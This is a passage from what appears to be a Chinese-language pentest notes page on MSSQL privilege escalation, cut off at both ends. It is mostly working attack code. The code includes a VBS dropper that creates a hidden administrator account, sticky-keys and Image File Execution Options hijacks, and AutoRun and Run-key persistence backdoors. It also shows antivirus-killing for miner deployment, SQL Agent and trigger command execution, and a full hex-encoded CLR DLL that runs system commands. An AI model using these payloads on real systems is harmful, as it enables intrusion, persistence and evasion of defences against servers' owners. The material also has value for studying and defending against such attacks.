<pre><code class="hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@sp_passwordxieo</span> <span class="hljs-type">int</span>, <span class="hljs-variable">@f</span> <span class="hljs-type">int</span>, <span class="hljs-variable">@t</span> <span class="hljs-type">int</span>, <span class="hljs-variable">@ret</span> <span class="hljs-type">int</span>
<span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">'scripting.filesystemobject'</span>, <span class="hljs-variable">@sp_passwordxieo</span> <span class="hljs-keyword">out</span>
<span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@sp_passwordxieo</span>, <span class="hljs-string">'createtextfile'</span>, <span class="hljs-variable">@f</span> <span class="hljs-keyword">out</span>, <span class="hljs-string">'d:\RECYCLER\1.vbs'</span>, <span class="hljs-number">1</span>
<span class="hljs-keyword">exec</span> <span class="hljs-variable">@ret</span> <span class="hljs-operator">=</span> sp_oamethod <span class="hljs-variable">@f</span>, <span class="hljs-string">'writeline'</span>, <span class="hljs-keyword">NULL</span>,<span class="hljs-string">'set wsnetwork=CreateObject("WSCRIPT.NETWORK")'</span>
<span class="hljs-keyword">exec</span> <span class="hljs-variable">@ret</span> <span class="hljs-operator">=</span> sp_oamethod <span class="hljs-variable">@f</span>, <span class="hljs-string">'writeline'</span>, <span class="hljs-keyword">NULL</span>,<span class="hljs-string">'os="WinNT://"&amp;wsnetwork.ComputerName'</span>
<span class="hljs-keyword">exec</span> <span class="hljs-variable">@ret</span> <span class="hljs-operator">=</span> sp_oamethod <span class="hljs-variable">@f</span>, <span class="hljs-string">'writeline'</span>, <span class="hljs-keyword">NULL</span>,<span class="hljs-string">'Set ob=GetObject(os)'</span>
<span class="hljs-keyword">exec</span> <span class="hljs-variable">@ret</span> <span class="hljs-operator">=</span> sp_oamethod <span class="hljs-variable">@f</span>, <span class="hljs-string">'writeline'</span>, <span class="hljs-keyword">NULL</span>,<span class="hljs-string">'Set oe=GetObject(os&amp;"/Administrators,group")'</span>
<span class="hljs-keyword">exec</span> <span class="hljs-variable">@ret</span> <span class="hljs-operator">=</span> sp_oamethod <span class="hljs-variable">@f</span>, <span class="hljs-string">'writeline'</span>, <span class="hljs-keyword">NULL</span>,<span class="hljs-string">'Set od=ob.Create("user","123$")'</span>
<span class="hljs-keyword">exec</span> <span class="hljs-variable">@ret</span> <span class="hljs-operator">=</span> sp_oamethod <span class="hljs-variable">@f</span>, <span class="hljs-string">'writeline'</span>, <span class="hljs-keyword">NULL</span>,<span class="hljs-string">'od.SetPassword "123"'</span>
<span class="hljs-keyword">exec</span> <span class="hljs-variable">@ret</span> <span class="hljs-operator">=</span> sp_oamethod <span class="hljs-variable">@f</span>, <span class="hljs-string">'writeline'</span>, <span class="hljs-keyword">NULL</span>,<span class="hljs-string">'od.SetInfo'</span>
<span class="hljs-keyword">exec</span> <span class="hljs-variable">@ret</span> <span class="hljs-operator">=</span> sp_oamethod <span class="hljs-variable">@f</span>, <span class="hljs-string">'writeline'</span>, <span class="hljs-keyword">NULL</span>,<span class="hljs-string">'Set of=GetObject(os&amp;"/123$",user)'</span>
<span class="hljs-keyword">exec</span> <span class="hljs-variable">@ret</span> <span class="hljs-operator">=</span> sp_oamethod <span class="hljs-variable">@f</span>, <span class="hljs-string">'writeline'</span>, <span class="hljs-keyword">NULL</span>,<span class="hljs-string">'oe.add os&amp;"/123$"'</span>;</code></pre>
<h2 id="xp_regwrite提权">xp_regwrite提权</h2>
<p>利用条件</p>
<ul>
<li>xpstar.dll</li>
</ul>
<p><strong>修改注册表来劫持粘贴键(映像劫持)</strong></p>
<p>利用regwrite函数修改注册表，起到劫持作用</p>
<pre><code class="hljs sql"><span class="hljs-keyword">exec</span> master..xp_regwrite <span class="hljs-variable">@rootkey</span><span class="hljs-operator">=</span><span class="hljs-string">'HKEY_LOCAL_MACHINE'</span>,<span class="hljs-variable">@key</span><span class="hljs-operator">=</span><span class="hljs-string">'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.EXE'</span>,<span class="hljs-variable">@value_name</span><span class="hljs-operator">=</span><span class="hljs-string">'Debugger'</span>,<span class="hljs-variable">@type</span><span class="hljs-operator">=</span><span class="hljs-string">'REG_SZ'</span>,<span class="hljs-variable">@value</span><span class="hljs-operator">=</span><span class="hljs-string">'c:\windows\system32\cmd.exe'</span>

<span class="hljs-comment">-- 检查是否劫持成功</span>
<span class="hljs-keyword">exec</span> master..xp_regread <span class="hljs-string">'HKEY_LOCAL_MACHINE'</span>,<span class="hljs-string">'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe'</span>,<span class="hljs-string">'Debugger'</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="../SecImages/Pasted%20image%2020240806212601.png" alt></p>
<p><strong>将 COM 对象注册到 CLSID</strong></p>
<p>在进行 sp_oacreate 利用的时候就有使用 com 组件执行命令的方法</p>
<pre><code class="hljs sql"><span class="hljs-comment">-- 使用其 CLSID '0D43FE01-F093-11CF-8940-00A0C9054228' 注册 'The File System Object component'</span>
<span class="hljs-keyword">EXEC</span> xp_regwrite N<span class="hljs-string">'HKEY_ CLASSES_ROOT'</span>,
N<span class="hljs-string">'CLSID\{0D43FE01-F093-11CF-8940-00A0C9054228}\'</span>, N<span class="hljs-string">''</span>, REG_SZ, N<span class="hljs-string">'FileSystem Object'</span>;
<span class="hljs-keyword">EXEC</span> xp_regwrite N<span class="hljs-string">'HKEY_CLASSES_ROOT'</span>,
N<span class="hljs-string">'CLSID\(0D43FE01-F093-11CF-8940-00A0C9054228}\InProcServer32'</span>, N<span class="hljs-string">''</span>,
REG_SZ, N<span class="hljs-string">'%systemroot%\system32\scrrun.dll'</span>;
<span class="hljs-keyword">EXEC</span> xp_regwrite N<span class="hljs-string">'HKEY_CLASSES_ROOT'</span>,
N<span class="hljs-string">'CLSID\{0D43FE01-F093-11CF-8940-00A0C9054228}\ProgID'</span>,N<span class="hljs-string">''</span>,REG_SZ,
N<span class="hljs-string">'Scripting.FileSystemObject'</span>;
<span class="hljs-keyword">EXEC</span> xp_regwrite N<span class="hljs-string">'HKEY_CLASSES_ROOT'</span>,
N<span class="hljs-string">'CLSID\{0D43FE01-F093-11CF-8940-00A0C9054228}\TypeLib'</span>,N<span class="hljs-string">''</span>,REG_SZ,
N<span class="hljs-string">'{420B2830-E718-11CF-893D-00A0C9054228}'</span>;
<span class="hljs-keyword">EXEC</span> xp_regwrite N<span class="hljs-string">'HKEY_CLASSES_ROOT'</span>,
N<span class="hljs-string">'CLSID\{0D43FE01-F093-11CF-8940-00A0C9054228}\Version'</span>,N<span class="hljs-string">''</span>,REG_SZ,
N<span class="hljs-string">'1.0'</span>;</code></pre>
<p><strong>CMD AutoRun</strong></p>
<p>当 CMD.exe（命令处理器）启动时，如果未指定 /D 标志，将执行 AutoRun 命令。</p>
<pre><code class="hljs sql"><span class="hljs-comment">-- 将 CMD.exe 的 AutoRun 注册表项与软件可执行路径 (c:\windows\system32\calc.exe) 添加,作为持久化的后门</span>
<span class="hljs-keyword">EXEC</span> master..xp_regwrite <span class="hljs-string">'HKEY_LOCAL_MACHINE'</span>,<span class="hljs-string">'SOFTWARE\Microsoft\Command Processor'</span>,<span class="hljs-string">'Autorun'</span>,<span class="hljs-string">'REG_SZ'</span>,<span class="hljs-string">'c:\windows\system32\calc.exe'</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="../SecImages/Pasted%20image%2020240806212626.png" alt></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="../SecImages/Pasted%20image%2020240806212632.png" alt></p>
<p><strong>Run &amp; RunOnce</strong></p>
<p>Run 和 RunOnce 注册表项会导致程序在用户每次登录时运行。</p>
<pre><code class="hljs sql"><span class="hljs-comment">-- 通过将带有可执行路径 (c:\windows\system32\calc.exe) 的 Aut3 条目添加到此注册表路径，攻击者确保每次用户登录服务器时都会执行恶意软件。</span>
<span class="hljs-keyword">EXEC</span> master.dbo.xp_regwrite <span class="hljs-string">'HKEY_LOCAL_MACHINE'</span>,<span class="hljs-string">'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'</span>,<span class="hljs-string">'Aut3'</span>,<span class="hljs-string">'REG_SZ'</span>,<span class="hljs-string">'c:\windows\system32\calc.exe'</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="../SecImages/Pasted%20image%2020240806212651.png" alt></p>
<p>注销，重新登录,触发 calc</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="../SecImages/Pasted%20image%2020240806212658.png" alt></p>
<p><strong>禁用指定软件</strong></p>
<p>攻击者需要确保在部署加密矿工时杀死反病毒进程以保持不被发现。所以可以设置在某些应用启动时自动关闭.</p>
<pre><code class="hljs sql"><span class="hljs-comment">-- 禁用正在运行的进程的方法是使用 IFEO（Image File Execution Options），通过添加值为 taskkill 的调试器键，在这种情况下将杀死特定进程 Everything.exe：</span>
<span class="hljs-keyword">EXEC</span> master.dbo.xp_regwrite <span class="hljs-string">'HKEY_LOCAL_MACHINE'</span>,<span class="hljs-string">'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Everything.exe'</span>,<span class="hljs-string">'Debugger'</span>,<span class="hljs-string">'REG_SZ'</span>,<span class="hljs-string">'taskkill.exe'</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="../SecImages/Pasted%20image%2020240806212719.png" alt></p>
<p>此时只要开启 Everything 就会自动关闭.</p>
<h2 id="agent-job提权">Agent Job提权</h2>
<p>SQL Server 代理是一项 Microsoft Windows 服务，它执行计划的管理任务，这些任务在 SQL Server 中称为作业。</p>
<p>利用条件</p>
<ul>
<li>拥有 DBA 权限</li>
<li>需要 sqlserver 代理 (sqlagent) 开启，Express 版本Sql Server 是无法启用的</li>
</ul>
<pre><code class="hljs sql"><span class="hljs-comment">-- 开启 sqlagent 服务</span>
<span class="hljs-keyword">exec</span> master.dbo.xp_servicecontrol <span class="hljs-string">'start'</span>,<span class="hljs-string">'SQLSERVERAGENT'</span>;

<span class="hljs-comment">-- 利用任务计划命令执行（无回显,可以 dnslog）</span>
<span class="hljs-comment">-- 创建任务 test，这里test为任务名称，并执行命令，命令执行后的结果，将返回给文本文档out.txt</span>

use msdb;
<span class="hljs-keyword">exec</span> sp_delete_job <span class="hljs-keyword">null</span>,<span class="hljs-string">'test'</span>
<span class="hljs-keyword">exec</span> sp_add_job <span class="hljs-string">'test'</span>
<span class="hljs-keyword">exec</span> sp_add_jobstep <span class="hljs-keyword">null</span>,<span class="hljs-string">'test'</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">'1'</span>,<span class="hljs-string">'cmdexec'</span>,<span class="hljs-string">'cmd /c "whoami&gt;c:/out.txt"'</span>
<span class="hljs-keyword">exec</span> sp_add_jobserver <span class="hljs-keyword">null</span>,<span class="hljs-string">'test'</span>,@<span class="hljs-variable">@servername</span>
<span class="hljs-keyword">exec</span> sp_start_job <span class="hljs-string">'test'</span>;</code></pre>
<h2 id="clr提权">CLR提权</h2>
<p>从 SQL Server 2005 (9.x) 开始，SQL Server 集成了用于 Microsoft Windows 的 .NET Framework 的公共语言运行时 (CLR) 组件。 这意味着现在可以使用任何 .NET Framework 语言（包括 Microsoft Visual Basic .NET 和 Microsoft Visual C#）来编写存储过程、触发器、用户定义类型、用户定义函数、用户定义聚合和流式表值函数。</p>
<p>-&nbsp;<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sql/relational-databases/clr-integration/common-language-runtime-clr-integration-programming-concepts?view=sql-server-ver15">https://docs.microsoft.com/zh-cn/sql/relational-databases/clr-integration/common-language-runtime-clr-integration-programming-concepts?view=sql-server-ver15</a></p>
<p>CLR 方式可以利用 16 进制文件流方式导入 DLL 文件，不需要文件落地<br>
-&nbsp;<a target="_blank" rel="noopener" href="https://github.com/SafeGroceryStore/MDUT/blob/main/MDAT-DEV/src/main/Plugins/Mssql/clr.txt">MDUT 中的16进制的dll</a></p>
<p>dll的制作可以参考下面的文章<br>
-&nbsp;<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10955#toc-12">https://xz.aliyun.com/t/10955#toc-12</a></p>
<p>利用条件</p>
<ul>
<li>拥有DBA权限</li>
</ul>
<pre><code class="hljs sql"><span class="hljs-comment">-- 启用CLR,SQL Server 2017版本之前</span>
sp_configure <span class="hljs-string">'show advanced options'</span>,<span class="hljs-number">1</span>;RECONFIGURE; <span class="hljs-comment">-- 显示高级选项</span>
sp_configure <span class="hljs-string">'clr enabled'</span>,<span class="hljs-number">1</span>;RECONFIGURE; <span class="hljs-comment">-- 启用CLR</span>
<span class="hljs-keyword">ALTER</span> DATABASE master <span class="hljs-keyword">SET</span> TRUSTWORTHY <span class="hljs-keyword">ON</span>; <span class="hljs-comment">-- 将存储.Net程序集的数据库配置为可信赖的</span>

<span class="hljs-comment">-- 启用CLR，SQL Server 2017版本及之后,引入了严格的安全性，可以选择根据提供的 SHA512 散列专门授予单个程序集的 UNSAFE 权限</span>
sp_configure <span class="hljs-string">'show advanced options'</span>,<span class="hljs-number">1</span>;RECONFIGURE;
sp_configure <span class="hljs-string">'clr enabled'</span>,<span class="hljs-number">1</span>;RECONFIGURE;
sp_add_trusted_assembly <span class="hljs-variable">@hash</span><span class="hljs-operator">=</span> <span class="hljs-operator">&lt;</span>SHA512 <span class="hljs-keyword">of</span> DLL<span class="hljs-operator">&gt;</span>; <span class="hljs-comment">-- 将某程序集的SHA512哈希值添加到可信程序集列表中</span>

<span class="hljs-comment">-- 配置 EXTERNAL ACCESS ASSEMBLY 权限, test 是我指定的数据库</span>
<span class="hljs-keyword">EXEC</span> sp_changedbowner <span class="hljs-string">'sa'</span>
<span class="hljs-keyword">ALTER</span> DATABASE [test] <span class="hljs-keyword">SET</span> trustworthy <span class="hljs-keyword">ON</span>

<span class="hljs-comment">-- 导入CLR插件</span>
<span class="hljs-keyword">CREATE</span> ASSEMBLY [mssql_CLR]
  <span class="hljs-keyword">AUTHORIZATION</span> [dbo]
  <span class="hljs-keyword">FROM</span> <span class="hljs-number">0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C010300660705620000000000000000E00022200B013000000E00000006000000000000522C0000002000000040000000000010002000000002000004000000000000000400000000000000008000000002000000000000030040850000100000100000000010000010000000000000100000000000000000000000002C00004F00000000400000A802000000000000000000000000000000000000006000000C000000C82A00001C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E74657874000000580C000000200000000E000000020000000000000000000000000000200000602E72737263000000A8020000004000000004000000100000000000000000000000000000400000402E72656C6F6300000C0000000060000000020000001400000000000000000000000000004000004200000000000000000000000000000000342C00000000000048000000020005007C2200004C0800000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000CA00280600000A72010000706F0700000A00280600000A7243000070725300007002280800000A28020000066F0700000A002A001B300600BC0100000100001173040000060A00730900000A0B076F0A00000A026F0B00000A0003280C00000A16FE010D092C0F00076F0A00000A036F0D00000A0000076F0A00000A176F0E00000A00076F0A00000A176F0F00000A00076F0A00000A166F1000000A00076F0A00000A176F1100000A00076F0A00000A176F1200000A0006731300000A7D010000040706FE0605000006731400000A6F1500000A00140C00076F1600000A26076F1700000A00076F1800000A6F1900000A0C076F1A00000A0000DE18130400280600000A11046F1B00000A6F0700000A0000DE00076F1C00000A16FE01130511052C1D00280600000A067B010000046F1D00000A6F0700000A000038AA00000000731300000A130608280C00000A16FE01130711072C0B001106086F1E00000A2600067B010000046F1F00000A16FE03130811082C22001106725D0000706F1E00000A261106067B010000046F1D00000A6F1E00000A2600280600000A1C8D0E000001251602A2251703A225187275000070A22519076F1C00000A13091209282000000AA2251A72AD000070A2251B1106252D0426142B056F1D00000AA2282100000A6F0700000A0000067B010000046F1D00000A130A2B00110A2A011000000000970025BC0018080000012202282200000A002A4E027B01000004046F2300000A6F1E00000A262A00000042534A4201000100000000000C00000076342E302E33303331390000000005006C000000A8020000237E000014030000B403000023537472696E677300000000C8060000B4000000235553007C0700001000000023475549440000008C070000C000000023426C6F620000000000000002000001571502000902000000FA0133001600000100000014000000030000000100000005000000050000002300000005000000010000000100000003000000010000000000D60101000000000006007001BA0206009001BA0206004601A7020F00DA02000006003C03E4010A005A015A020E001503A7020600EB01E40106002C027A0306002B01BA020E00FA02A7020A0086035A020A0023015A020600C401E4010E000302A7020E00D200A7020E004102A70206001402360006002102360006002700E401000000002D00000000000100010001001000E9020000150001000100030110000100000015000100040006007003790050200000000096008D007D000100842000000000960099001A0002005C22000000008618A102060004005C22000000008618A102060004006522000000008300160082000400000001007F0000000100F200000002002B03000001003A020000020010030900A10201001100A10206001900A1020A003100A10206005100A102060061001A0110006900A4001500710035031A003900A10206003900F50132007900E50015007100A403370079001D031500790091033C007900C20041007900AE013C00790087023C00790055033C004900A10206008900A1024700390068004D0039004F0353003900FB000600390075025700990083005C003900430306004100B6005C003900A90060002900C2015C0049000F0164004900CB016000A100C2015C00710035036A002900A1020600590056005C0020002300BA002E000B0089002E00130092002E001B00B10063002B00BA0020000480000000000000000000000000000000004000000004000000000000000000000070005F000000000004000000000000000000000070004A00000000000400000000000000000000007000E40100000000030002000000003C3E635F5F446973706C6179436C617373315F30003C52756E436F6D6D616E643E625F5F3000496E743332003C4D6F64756C653E0053797374656D2E494F006D7373716C5F434C520053797374656D2E44617461006765745F44617461006D73636F726C6962006164645F4F757470757444617461526563656976656400636D640052656164546F456E640045786563436F6D6D616E640052756E436F6D6D616E640053656E64006765745F45786974436F6465006765745F4D657373616765007365745F57696E646F775374796C650050726F6365737357696E646F775374796C65007365745F46696C654E616D650066696C656E616D6500426567696E4F7574707574526561644C696E6500417070656E644C696E65006765745F506970650053716C5069706500436F6D70696C657247656E6572617465644174747269627574650044656275676761626C654174747269627574650053716C50726F63656475726541747472696275746500436F6D70696C6174696F6E52656C61786174696F6E734174747269627574650052756E74696D65436F6D7061746962696C697479417474726962757465007365745F5573655368656C6C4578656375746500546F537472696E67006765745F4C656E677468006D7373716C5F434C522E646C6C0053797374656D00457863657074696F6E006765745F5374617274496E666F0050726F636573735374617274496E666F0053747265616D526561646572005465787452656164657200537472696E674275696C6465720073656E646572004461746152656365697665644576656E7448616E646C6572004D6963726F736F66742E53716C5365727665722E536572766572006765745F5374616E646172644572726F72007365745F52656469726563745374616E646172644572726F72002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730053746F72656450726F63656475726573004461746152656365697665644576656E744172677300617267730050726F63657373007365745F417267756D656E747300617267756D656E747300436F6E636174004F626A6563740057616974466F7245786974005374617274007365745F52656469726563745374616E646172644F7574707574007374644F75747075740053797374656D2E546578740053716C436F6E74657874007365745F4372656174654E6F57696E646F770049734E756C6C4F72456D707479000000004143006F006D006D0061006E0064002000690073002000720075006E006E0069006E0067002C00200070006C006500610073006500200077006100690074002E00000F63006D0064002E00650078006500000920002F0063002000001753007400640020006F00750074007000750074003A0000372000660069006E00690073006800650064002000770069007400680020006500780069007400200063006F006400650020003D00200000053A00200000005E54E0227F5F5E409B9302C5EA5F62E7000420010108032000010520010111110400001235042001010E0500020E0E0E11070B120C121D0E0212210212250202080E042000123D040001020E0420010102052001011141052002011C180520010112450320000204200012490320000E0320000805200112250E0500010E1D0E08B77A5C561934E08903061225040001010E062002011C122D0801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F777301080100070100000000040100000000000000006607056200000000020000001C010000E42A0000E40C000052534453F12CF9670467FE4789AA4C0BB3C9132401000000433A5C55736572735C546573745C736F757263655C7265706F735C6D7373716C5F434C525C6D7373716C5F434C525C6F626A5C44656275675C6D7373716C5F434C522E70646200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000282C00000000000000000000422C0000002000000000000000000000000000000000000000000000342C0000000000000000000000005F436F72446C6C4D61696E006D73636F7265652E646C6C0000000000FF250020001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000004C02000000000000000000004C0234000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000000000000000000000000000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004AC010000010053007400720069006E006700460069006C00650049006E0066006F0000008801000001003000300030003000300034006200300000002C0002000100460069006C0065004400650073006300720069007000740069006F006E000000000020000000300008000100460069006C006500560065007200730069006F006E000000000030002E0030002E0030002E00300000003C000E00010049006E007400650072006E0061006C004E0061006D00650000006D007300730071006C005F0043004C0052002E0064006C006C0000002800020001004C006500670061006C0043006F00700079007200690067006800740000002000000044000E0001004F0072006900670069006E0061006C00460069006C0065006E0061006D00650000006D007300730071006C005F0043004C0052002E0064006C006C000000340008000100500072006F006400750063007400560065007200730069006F006E00000030002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000030002E0030002E0030002E0030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000C000000543C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span>
  <span class="hljs-keyword">WITH</span> PERMISSION_SET <span class="hljs-operator">=</span> UNSAFE;
GO

<span class="hljs-comment">-- 创建CLR函数</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">PROCEDURE</span> [dbo].[ExecCommand]
<span class="hljs-variable">@cmd</span> NVARCHAR (MAX)
<span class="hljs-keyword">AS</span> <span class="hljs-keyword">EXTERNAL</span> NAME [mssql_CLR].[StoredProcedures].[ExecCommand]
go

<span class="hljs-comment">-- 利用CLR执行系统命令</span>
<span class="hljs-keyword">exec</span> dbo.ExecCommand "whoami /all";</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="../SecImages/Pasted%20image%2020240806212953.png" alt></p>
<p>格式简化</p>
<pre><code class="hljs sql"><span class="hljs-comment">-- 导入CLR插件</span>
<span class="hljs-keyword">CREATE</span> ASSEMBLY [clrdata]
<span class="hljs-keyword">AUTHORIZATION</span> [dbo]
<span class="hljs-keyword">FROM</span> <span class="hljs-number">0x16</span>进制的dll
<span class="hljs-keyword">WITH</span> PERMISSION_SET <span class="hljs-operator">=</span> UNSAFE;

<span class="hljs-comment">-- 创建CLR函数</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">PROCEDURE</span> [dbo].[testclrexec]
<span class="hljs-variable">@method</span> NVARCHAR (MAX) , <span class="hljs-variable">@arguments</span> NVARCHAR (MAX)
<span class="hljs-keyword">AS</span> <span class="hljs-keyword">EXTERNAL</span> NAME [clrdata].[StoredProcedures].[testclrexec]

<span class="hljs-comment">-- 利用CLR执行系统命令</span>
<span class="hljs-keyword">exec</span> testclrexec <span class="hljs-string">'cmdexec'</span>,N<span class="hljs-string">'whoami'</span></code></pre>
<h2 id="触发器提权">触发器提权</h2>
<p>触发器是一种特殊类型的存储过程，它不同于存储过程。触发器主要是通过事件进行触发被自动调用执行的。而存储过程可以通过存储过程的名称被调用。</p>
<p>SqlServer 包括三种常规类型的触发器：DML 触发器、DDL 触发器和登录触发器</p>
<p><strong>登录触发器</strong></p>
<p>登录触发器将为响应 LOGIN 事件而激发存储过程。与 SQL Server 实例建立用户会话时将引发此事件。登录触发器将在登录的身份验证阶段完成之后且用户会话实际建立之前激发。因此，来自触发器内部且通常将到达用户的所有消息(例如错误消息和来自 PRINT 语句的消息)会传送到 SQL Server 错误日志。如果身份验证失败，将不激发登录触发器。</p>
<pre><code class="hljs sql"><span class="hljs-comment">-- 设置一个触发器 ffffffff0x,当 user 表更新时触发命令</span>
<span class="hljs-keyword">set</span> ANSI_NULLS <span class="hljs-keyword">on</span>
go
<span class="hljs-keyword">set</span> QUOTED_IDENTIFIER <span class="hljs-keyword">on</span>
go
<span class="hljs-keyword">create</span> <span class="hljs-keyword">trigger</span> [ffffffff0x]
<span class="hljs-keyword">on</span> [<span class="hljs-keyword">user</span>]
AFTER <span class="hljs-keyword">UPDATE</span> <span class="hljs-keyword">as</span>
<span class="hljs-keyword">begin</span>
    <span class="hljs-keyword">execute</span> master..xp_cmdshell <span class="hljs-string">'cmd.exe /c calc.exe'</span>
<span class="hljs-keyword">end</span>
go

<span class="hljs-comment">-- user 表 update 更新时，自动触发</span>
<span class="hljs-keyword">UPDATE</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">SET</span> id <span class="hljs-operator">=</span> <span class="hljs-string">'22'</span> <span class="hljs-keyword">WHERE</span> nickname <span class="hljs-operator">=</span> <span class="hljs-string">'f0x'</span></code></pre>
<p>实际测试，可以看到执行命令卡住了,一直没有结束</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="../SecImages/Pasted%20image%2020240806213052.png" alt></p>
<p>查看任务管理器，calc 运行了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="../SecImages/Pasted%20image%2020240806213106.png" alt></p>
<p>手动将 calc 结束,此时语句执行完毕返回结果，执行时间等于 calc 运行的时间</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="../SecImages/Pasted%20image%2020240806213117.png" alt></p>
<h2 id="mssql-r-和-python-提权">Mssql R 和 Python 提权</h2>
<p>在 SQL Server 2017 及更高版本中，R 与 Python 一起随附在机器学习服务中。该服务允许通过 SQL Server 中 sp_execute_external_script 执行 Python 和 R 脚本</p>
<p>利用条件：</p>
<ul>
<li>Machine Learning Services 必须要在 Python 安装过程中选择</li>
</ul>
<p>必须启用外部脚本</p>
<ul>
<li>EXEC sp_configure ‘external scripts enabled’, 1</li>
<li>RECONFIGURE WITH OVERRIDE</li>
<li>重新启动数据库服务器</li>
<li>用户拥有执行任何外部脚本权限</li>
</ul>
<p><strong>R 脚本利用</strong></p>
<pre><code class="hljs R"><span class="hljs-operator">-</span><span class="hljs-operator">-</span> 利用 R 执行命令
sp_configure <span class="hljs-string">'external scripts enabled'</span>
GO
EXEC sp_execute_external_script
<span class="hljs-operator">@</span>language<span class="hljs-operator">=</span>N<span class="hljs-string">'R'</span><span class="hljs-punctuation">,</span>
